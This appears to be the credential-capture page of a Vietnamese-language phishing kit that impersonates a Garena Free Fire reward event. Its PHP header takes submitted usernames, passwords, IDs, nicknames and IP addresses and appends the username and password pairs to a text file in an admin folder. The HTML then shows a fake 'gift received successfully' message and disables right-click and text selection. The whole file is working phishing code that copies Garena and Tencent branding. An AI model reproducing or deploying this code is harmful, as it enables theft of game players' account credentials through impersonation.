<?php

if(isset($_POST['ip'])){
require('nguyentienphuoc/xem-cai-lon.php');
$ng = new ngControllers();
$user = $ng->post($_REQUEST['user']);
$pass = $ng->post($_REQUEST['pass']);
$id = $ng->post($_REQUEST['id']);
$nick = $ng->post($_REQUEST['nick']);
$ip = $ng->post($_REQUEST['ip']);
$file = fopen('admin/hn.txt','a');
        fwrite($file,$user.'|'.$pass.PHP_EOL);
        fclose($file); 
}else{
header('location:index.php');
exit();
}

?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="">
<meta name="description" content="">
<meta property="og:description" content="">
<meta property="og:url" content="./">
<meta property="og:site_name" content="">
<meta property="og:type" content="website">
<meta name="copyright"content="">
<meta name="theme-color" content="">
<meta property="og:image" content="">
<title>Nhận quà thành công</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="/img/icon.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="containerHome rewardsBox">
<div class="navbar">
<img class="navbar-logo" src="img/icon.png">
<div class="navbar-title">
GARENA FREE FIRE
<br>
<span>Sự Kiện Free Fire</span>
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-menu" src="https://i.ibb.co/DV5fKmN/menu.png">
<img class="navbar-pay" src="https://i.ibb.co/FzLrjnF/pay.png">
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<video id="headerVideo" src="media/header.mp4" loop muted></video>
</div> <!--- header --->
<div class="box">
<div class="season-title">
<img src="img/season-title-slogan.png">
</div>

<div class="tab_rewards" id="latest">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="onee.play();" onclick="open_reward_confirmation(this);" src="img/rewards/1.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/2.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/3.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/4.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/5.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/6.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/7.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/8.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/9.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/10.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/10.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/11.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/11.png">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/12.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/12.png">Nhận</button>
</div>
</div>
</div> <!--- scroll --->
</center>
<div class="footer">
<div class="footer-txt-follow">Theo Dõi Chúng Tôi</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="img/link_1.png">
<img class="footer-follow-icon" src="img/link_2.png">
<img class="footer-follow-icon" src="img/link_3.png">
<img class="footer-follow-icon" src="img/link_4.png">
<img class="footer-follow-icon" src="img/link_5.png">
</center>


<div class="footer-txt-copyright">ⓒ 2017- Garena. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Processing Rewards</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-alert">
Thông báo
<br>
<br>
<p>Nhận quà thành công, vui lòng đợi ít phút chúng tôi sẽ tiến hành trao quà.</p>
<br>

</div> <!--- popup-alert --->
<div class="popup-btn-wrapper">
<button type="button" onmousedown="buka.play();" class="popup-btn-active-center" onclick="location.href='/';">Logout</button>
</div> <!--- popup-btn-wrapper --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script type="text/javascript" src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/timer.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>